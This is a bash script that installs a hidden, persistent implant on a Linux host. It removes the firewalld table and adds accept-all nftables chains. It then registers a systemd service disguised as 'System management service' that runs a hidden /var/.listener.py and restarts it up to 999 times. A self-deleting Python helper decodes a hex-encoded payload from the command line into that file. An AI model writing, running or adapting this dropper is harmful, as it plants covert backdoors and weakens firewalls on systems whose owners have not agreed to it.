#!/bin/bash
apt-get update && apt-get install -y nftables 
apt-get update && apt-get install -y python3 
apt-get update && apt-get install -y pip
yum install -y nftables 
yum install -y python3
yum install -y pip
nft delete table inet firewalld
nft add table firewall
nft add chain firewall vIn \{ type filter hook input priority -101 \; policy accept\; \}
nft add chain firewall vOut \{ type filter hook output priority -101 \; policy accept\; \}
cat <<EOFA > /etc/systemd/system/systemb.service
[Unit]
Description=System management service.

[Service]
Type=simple
Restart=on-failure
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/bin/bash -c '/var/.listener.py'
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
EOFA
cat <<EOFA > /tmp/test.py
import sys
import os
def main():
	os.system('touch /var/.listener.py')
	package = bytes.fromhex(sys.argv[1]).decode('utf-8')
	os.system('echo "' + package + '" > /var/.listener.py')
	self = sys.argv[0]
	os.system("rm " + self)
main()
EOFA
python3 /tmp/test.py $1
chmod +x /var/.listener.py
systemctl daemon-reload
systemctl enable systemb
systemctl start systemb